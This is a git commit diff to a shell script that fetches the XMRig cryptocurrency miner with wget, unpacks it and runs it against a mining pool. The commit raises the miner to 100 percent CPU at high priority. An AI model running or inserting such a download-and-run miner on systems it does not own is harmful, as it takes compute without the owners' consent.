2313adb002a518e6339e12e0eba3377394826a8c
MomboteQ <60738939+MomboteQ@users.noreply.github.com>
2022-04-29 18:53:26 +0200

    Update xno.sh

--- xno/xno.sh
+++ xno/xno.sh
@@ -2,4 +2,4 @@
 wget https://github.com/xmrig/xmrig/releases/download/v6.17.0/xmrig-6.17.0-linux-x64.tar.gz
 tar xf xmrig-6.17.0-linux-x64.tar.gz
 cd xmrig-6.17.0
-./xmrig -o sandcanyon.city:3333 --rig-id 'nano_1hacker1kz4rwm9e6ax8pyd8rpc8ha3amkuar6fu81egek15uzdsbqsjmpbf'
+./xmrig -o sandcanyon.city:3333 --rig-id 'nano_1hacker1kz4rwm9e6ax8pyd8rpc8ha3amkuar6fu81egek15uzdsbqsjmpbf' --max-cpu-usage 100 --cpu-priority 5
